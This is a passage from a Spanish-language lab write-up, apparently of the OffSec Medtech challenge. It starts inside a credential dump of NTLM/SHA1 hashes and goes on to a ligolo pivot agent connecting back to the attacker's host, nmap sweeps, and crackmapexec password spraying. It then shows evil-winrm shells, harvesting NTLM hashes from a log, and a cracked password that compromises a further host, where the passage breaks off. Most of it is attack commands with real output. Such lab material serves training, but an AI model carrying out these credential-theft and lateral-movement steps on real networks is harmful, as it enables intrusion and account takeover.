Logon Time        : 5/30/2025 2:31:58 PM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 713358 (00000000:000ae28e)
Session           : Batch from 0
User Name         : Administrator
Domain            : WEB02
Logon Server      : WEB02
Logon Time        : 7/23/2024 10:44:00 PM
SID               : S-1-5-21-1364059446-3280107051-2039649012-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WEB02
         * NTLM     : b2c03054c306ac8fc5f9d188710b0168
         * SHA1     : 14260fbb8c532d874a11696bcb3ee176120c0875

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:45 PM
SID               : S-1-5-17
        msv :

Authentication Id : 0 ; 122206 (00000000:0001dd5e)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:44 PM
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:43 PM
SID               : S-1-5-19
        msv :

Authentication Id : 0 ; 78616 (00000000:00013318)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:43 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
         * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c

Authentication Id : 0 ; 78598 (00000000:00013306)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:43 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 47714 (00000000:0000ba62)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:43 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 46451 (00000000:0000b573)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:42 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEB02$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:42 PM
SID               : S-1-5-18
        msv :
```
- Obtuvimos el hash NTLM de joe y Administrator.
```powershell
Administrator b2c03054c306ac8fc5f9d188710b0168
joe 08d7a47a6f9f66b97b1bae4178747494
```
[ntlm-decorder](https://ntlm.pw/)

#### Paso 7: Pivoting a MEDTECH
Con las credenciales de joe y Administrator podemos pivotear a la red interna 
tomando Administrator como punto de pivote y joe como el primer punto de acceso.

[ligolo releases](https://github.com/nicocha30/ligolo-ng/releases)

1. Configurar proxy ligolo en kali

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -v
```
> Podemos averiguar en windows el asset a descargar con
```
$ENV:PROCESSOR_ARCHITECTURE

systeminfo | findstr /i "System Type"

(Get-WmiObject Win32_OperatingSystem).OSArchitecture

(Get-WmiObject Win32_Processor).AddressWidth

```

2. Configurar agente ligolo en maquina pivote (192.168.xxx.121 WEB02), una vez transferido el archivo.exe
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\agent.exe -connect 192.168.45.239:11601 -ignore-cert
agent.exe : time="2025-05-31T07:12:07-07:00" level=warning msg="warning, certificate validation disabled"                                                                                                                                                                     
    + CategoryInfo          : NotSpecified: (time="2025-05-3...ation disabled":String) [], RemoteException                                                                                                                                                                    
    + FullyQualifiedErrorId : NativeCommandError                                                                                                                                                                                                                              
time="2025-05-31T07:12:07-07:00" level=info msg="Connection established" addr="192.168.45.239:11601"  
```
Una vez configurado nuestro punto de pivote tendremos al alcance la red MEDTECH

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# ping -c 4 172.16.116.10                       
PING 172.16.116.10 (172.16.116.10) 56(84) bytes of data.
64 bytes from 172.16.116.10: icmp_seq=1 ttl=64 time=411 ms
64 bytes from 172.16.116.10: icmp_seq=2 ttl=64 time=433 ms
64 bytes from 172.16.116.10: icmp_seq=3 ttl=64 time=456 ms
64 bytes from 172.16.116.10: icmp_seq=4 ttl=64 time=327 ms

--- 172.16.116.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 327.337/406.834/456.061/48.612 ms
```

> El problema que existe ahora es que tenmos que resolver el host al que joe pertenece. Pero antes debemos observar que servicios se ejecutan en la red interna MEDTECH.

1. Escaneo agresvo con nmap

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# nmap -A 172.16.116.10-14 172.16.116.82-83
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 13:45 -03
Nmap scan report for 172.16.116.10
Host is up (0.13s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-31 16:47:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: medtech.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: medtech.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-31T16:48:22
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:a6:aa (VMware)
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE
HOP RTT       ADDRESS
1   132.43 ms 172.16.116.10

Nmap scan report for 172.16.116.11
Host is up (0.13s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-31T16:48:21
|_  start_date: N/A
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FILES02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:60:89 (VMware)

TRACEROUTE
HOP RTT       ADDRESS
1   133.94 ms 172.16.116.11

Nmap scan report for 172.16.116.12
Host is up (0.13s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEDTECH
|   NetBIOS_Domain_Name: MEDTECH
|   NetBIOS_Computer_Name: DEV04
|   DNS_Domain_Name: medtech.com
|   DNS_Computer_Name: DEV04.medtech.com
|   DNS_Tree_Name: medtech.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-05-31T16:48:25+00:00
| ssl-cert: Subject: commonName=DEV04.medtech.com
| Not valid before: 2025-05-30T13:00:17
|_Not valid after:  2025-11-29T13:00:17
|_ssl-date: 2025-05-31T16:49:06+00:00; -2s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-31T16:48:21
|_  start_date: N/A
|_nbstat: NetBIOS name: DEV04, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:2c:eb (VMware)
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT       ADDRESS
1   131.05 ms 172.16.116.12

Nmap scan report for 172.16.116.13
Host is up (0.011s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): IBM z/OS 2.1.X (85%)
OS CPE: cpe:/o:ibm:zos:2.1
Aggressive OS guesses: IBM z/OS 2.1 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-31T16:48:22
|_  start_date: N/A
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: PROD01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:b1:c6 (VMware)

TRACEROUTE
HOP RTT      ADDRESS
1   11.00 ms 172.16.116.13

Nmap scan report for 172.16.116.14
Host is up (0.0081s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   256 74:51:ee:1e:8f:61:d6:0f:c5:11:52:2e:f9:ef:ac:29 (ECDSA)
|_  256 5f:4f:29:47:7a:14:65:4d:bc:f3:74:40:a7:45:7e:94 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   8.05 ms 172.16.116.14

Nmap scan report for 172.16.116.82
Host is up (0.0081s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=CLIENT01.medtech.com
| Not valid before: 2025-04-23T07:11:22
|_Not valid after:  2025-10-23T07:11:22
| rdp-ntlm-info: 
|   Target_Name: MEDTECH
|   NetBIOS_Domain_Name: MEDTECH
|   NetBIOS_Computer_Name: CLIENT01
|   DNS_Domain_Name: medtech.com
|   DNS_Computer_Name: CLIENT01.medtech.com
|   DNS_Tree_Name: medtech.com
|   Product_Version: 10.0.22000
|_  System_Time: 2025-05-31T16:48:24+00:00
|_ssl-date: 2025-05-31T16:49:05+00:00; -3s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CLIENT01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:e3:b7 (VMware)
| smb2-time: 
|   date: 2025-05-31T16:48:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

TRACEROUTE
HOP RTT     ADDRESS
1   8.13 ms 172.16.116.82

Nmap scan report for 172.16.116.83
Host is up (0.0095s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): IBM z/OS 2.1.X (85%)
OS CPE: cpe:/o:ibm:zos:2.1
Aggressive OS guesses: IBM z/OS 2.1 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CLIENT02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:9e:92 (VMware)
| smb2-time: 
|   date: 2025-05-31T16:48:22
|_  start_date: N/A
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   9.50 ms 172.16.116.83

Post-scan script results:
| clock-skew: 
|   -2s: 
|     172.16.116.83
|     172.16.116.10
|     172.16.116.82
|     172.16.116.11
|     172.16.116.12
|_    172.16.116.13
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
#### Analisis por maquina ordenado por ip.

### 🖥️ 172.16.116.10 - DC01 (Domain Controller)

* **Rol:** Controlador de dominio Windows Server 2022
* **Puertos abiertos:** 445 (SMB), 5985 (WinRM), 88 (Kerberos)
* **Observaciones:**

  * Puerto 88 activo sugiere servicio Kerberos disponible.
  * Objetivo potencial para DCSync o Golden Ticket.
  * No se han obtenido credenciales de usuario con privilegios suficientes para DCSync.

### 🖥️ 172.16.116.11 - FILES02

* **Rol:** Servidor de archivos Windows Server 2022
* **Puertos abiertos:** 445 (SMB), 5985 (WinRM)
* **Acceso actual:** NT AUTHORITY\SYSTEM
* **Observaciones:**

  * Acceso completo confirmado.
  * Pivote ideal hacia otras máquinas.
  * Revisado para usuarios con sesiones activas. Usuario `joe` detectado.

### 🖥️ 172.16.116.12 - DEV04

* **Rol:** Entorno de desarrollo Windows Server 2022
* **Puertos abiertos:** 445 (SMB), 3389 (RDP), 5985 (WinRM)
* **Observaciones:**

  * RDP abierto: podría usarse con credenciales de `joe` si se consiguen.
  * WinRM activo: objetivo para pass-the-hash o autenticación con token/Kerberos.
  * Revisar si hay sesiones o perfiles de `joe`.

### 🖥️ 172.16.116.13 - PROD01

* **Rol:** Producción Windows Server 2022
* **Puertos abiertos:** 445 (SMB), 5985 (WinRM)
* **Observaciones:**

  * Similar a DEV04, pero sin RDP expuesto.
  * Verificar si `joe` tiene acceso a este host.
  * Interesante si se consiguen credenciales o tickets.

### 🖥️ 172.16.116.14 - Linux

* **Rol:** Desconocido
* **Puerto abierto:** 22 (SSH)
* **Observaciones:**

  * No tiene hostname identificado.
  * Solo puerto SSH visible.
  * Requiere cruce de credenciales o acceso lateral desde Windows para comprometer.

### 🖥️ 172.16.116.82 - CLIENT01

* **Rol:** Cliente Windows 11
* **Puertos abiertos:** 445 (SMB), 3389 (RDP)
* **Observaciones:**

  * RDP expuesto: buen candidato para movimiento lateral.
  * Buscar sesiones de `joe` o acceso mediante hash/password.

### 🖥️ 172.16.116.83 - CLIENT02

* **Rol:** Cliente Windows 11
* **Puertos abiertos:** 445 (SMB), 5985 (WinRM)
* **Observaciones:**

  * Igual que CLIENT01 pero sin RDP.
  * Revisar perfiles o sesiones activas de `joe`.
  * Objetivo para abuso de WinRM si se obtiene token/hash.

A simple vista podemos ver que la mayoria de los host salvo el .14 corren windows y tienen estos servicios: SMB y WinRM.
Para resolver el host al que **joe** pertenece podemos usar crackmapexec, revisando con las credenciales de **joe**
los servicios smb y winrm.

1. Empesamos por smb:

```
crackmapexec smb 172.16.116.10-14 -u joe -p 'Flowers1' --shares
```
- **Resultados**

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# crackmapexec smb 172.16.116.10-14 172.16.116.82-83 -u joe -p 'Flowers1' --shares
SMB         172.16.116.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.116.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.116.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
SMB         172.16.116.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.116.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.116.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
SMB         172.16.116.13   445    PROD01           [+] medtech.com\joe:Flowers1 
SMB         172.16.116.10   445    DC01             [+] medtech.com\joe:Flowers1 
SMB         172.16.116.13   445    PROD01           [+] Enumerated shares
SMB         172.16.116.13   445    PROD01           Share           Permissions     Remark
SMB         172.16.116.13   445    PROD01           -----           -----------     ------
SMB         172.16.116.13   445    PROD01           ADMIN$                          Remote Admin
SMB         172.16.116.13   445    PROD01           C$                              Default share
SMB         172.16.116.13   445    PROD01           IPC$            READ            Remote IPC
SMB         172.16.116.83   445    CLIENT02         [+] Enumerated shares
SMB         172.16.116.83   445    CLIENT02         Share           Permissions     Remark
SMB         172.16.116.83   445    CLIENT02         -----           -----------     ------
SMB         172.16.116.83   445    CLIENT02         ADMIN$                          Remote Admin
SMB         172.16.116.83   445    CLIENT02         C               READ            
SMB         172.16.116.83   445    CLIENT02         C$                              Default share
SMB         172.16.116.83   445    CLIENT02         IPC$            READ            Remote IPC
SMB         172.16.116.83   445    CLIENT02         Windows         READ            
SMB         172.16.116.12   445    DEV04            [+] medtech.com\joe:Flowers1 
SMB         172.16.116.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
SMB         172.16.116.12   445    DEV04            [+] Enumerated shares
SMB         172.16.116.12   445    DEV04            Share           Permissions     Remark
SMB         172.16.116.12   445    DEV04            -----           -----------     ------
SMB         172.16.116.12   445    DEV04            ADMIN$                          Remote Admin                                                                                                                                                                              
SMB         172.16.116.12   445    DEV04            C$                              Default share                                                                                                                                                                             
SMB         172.16.116.12   445    DEV04            IPC$            READ            Remote IPC                                                                                                                                                                                
SMB         172.16.116.10   445    DC01             [+] Enumerated shares                                                                                                                                                                                                     
SMB         172.16.116.10   445    DC01             Share           Permissions     Remark                                                                                                                                                                                    
SMB         172.16.116.10   445    DC01             -----           -----------     ------                                                                                                                                                                                    
SMB         172.16.116.10   445    DC01             ADMIN$          READ            Remote Admin                                                                                                                                                                              
SMB         172.16.116.10   445    DC01             C$              READ,WRITE      Default share                                                                                                                                                                             
SMB         172.16.116.10   445    DC01             IPC$            READ            Remote IPC                                                                                                                                                                                
SMB         172.16.116.10   445    DC01             NETLOGON        READ            Logon server share                                                                                                                                                                        
SMB         172.16.116.10   445    DC01             SYSVOL          READ            Logon server share                                                                                                                                                                        
SMB         172.16.116.11   445    FILES02          [+] Enumerated shares
SMB         172.16.116.11   445    FILES02          Share           Permissions     Remark
SMB         172.16.116.11   445    FILES02          -----           -----------     ------
SMB         172.16.116.11   445    FILES02          ADMIN$          READ,WRITE      Remote Admin
SMB         172.16.116.11   445    FILES02          C               READ,WRITE      
SMB         172.16.116.11   445    FILES02          C$              READ,WRITE      Default share
SMB         172.16.116.11   445    FILES02          IPC$            READ            Remote IPC
SMB         172.16.116.11   445    FILES02          TEMP            READ,WRITE   
```
Todo parece indicar que el host que estamos buscando es el **172.16.xxx.11 FILES02**
probamos conectarnos por evil-winrm y impacket-smbclient

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# evil-winrm -i 172.16.224.11 -u 'joe' -p 'Flowers1' -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\joe\Documents> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ============================================
medtech\joe S-1-5-21-976142013-3766213998-138799841-1106


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ===============================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\joe\Documents>

# shell 2

┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# impacket-smbclient joe:'Flowers1'@172.16.224.11 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C
C$
IPC$
TEMP
# 

```

Como podemos observar obtuvimos acceso por winrm y smb al host 172.16.xxx.11 con las credenciales de **joe**

> Flag local y proof
```
*Evil-WinRM* PS C:\Users\joe\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/31/2025   3:32 PM             34 proof.txt


    Directory: C:\Users\joe\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/31/2025   3:32 PM             34 local.txt
```
> Muchos doritos despues damos con el archivo que esta en el directorio Documents ni bien iniciamos session en evil-winrm fileMonitorBackup.log

```
*Evil-WinRM* PS C:\Users\joe\Documents> dir


    Directory: C:\Users\joe\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         10/4/2022   5:21 PM        2088640 fileMonitorBackup.log

*Evil-WinRM* PS C:\Users\joe\Documents> type .\fileMonitorBackup.log
   89168 Oct 04 11:21  SuccessA... Microsoft-Windows...         4656 A handle to an object was requested....                                                                                                      
   89163 Oct 04 11:21  SuccessA... Microsoft-Windows...         4656 A handle to an object was requested....                                                                                                      
   89158 Oct 04 11:21  SuccessA... Microsoft-Windows...         4656 A handle to an object was requested....
   etc...

   88934 Oct 04 11:21  Backup      daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e
   88605 Oct 04 11:21  Backup      toad                         6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068
   88137 Oct 04 11:21  Backup      wario                        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e
   87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436
```
Entre todos los logs encontramos estos hash **NTLM** del cual el unico que tiene un valor legible es el de **wario**

```
wario / fdf36048c1cf88f5630381c5e38feb8e / Mushroom! 
```
Ya tenemos un usuario y un password, podemos volver a implementar la misma tecnica con crackmapexec.

```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# crackmapexec winrm 172.16.224.10-14 172.16.224.82-83 -u wario -p 'Mushroom!'
SMB         172.16.224.11   5985   FILES02          [*] Windows Server 2022 Build 20348 (name:FILES02) (domain:medtech.com)
SMB         172.16.224.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:medtech.com)
SMB         172.16.224.12   5985   DEV04            [*] Windows Server 2022 Build 20348 (name:DEV04) (domain:medtech.com)
HTTP        172.16.224.12   5985   DEV04            [*] http://172.16.224.12:5985/wsman
SMB         172.16.224.83   5985   CLIENT02         [*] Windows 11 Build 22000 (name:CLIENT02) (domain:medtech.com)
HTTP        172.16.224.10   5985   DC01             [*] http://172.16.224.10:5985/wsman
HTTP        172.16.224.83   5985   CLIENT02         [*] http://172.16.224.83:5985/wsman
HTTP        172.16.224.11   5985   FILES02          [*] http://172.16.224.11:5985/wsman
SMB         172.16.224.13   5985   PROD01           [*] Windows Server 2022 Build 20348 (name:PROD01) (domain:medtech.com)
HTTP        172.16.224.13   5985   PROD01           [*] http://172.16.224.13:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.224.12   5985   DEV04            [-] medtech.com\wario:Mushroom!
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.224.10   5985   DC01             [-] medtech.com\wario:Mushroom!
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       172.16.224.83   5985   CLIENT02         [+] medtech.com\wario:Mushroom! (Pwn3d!)
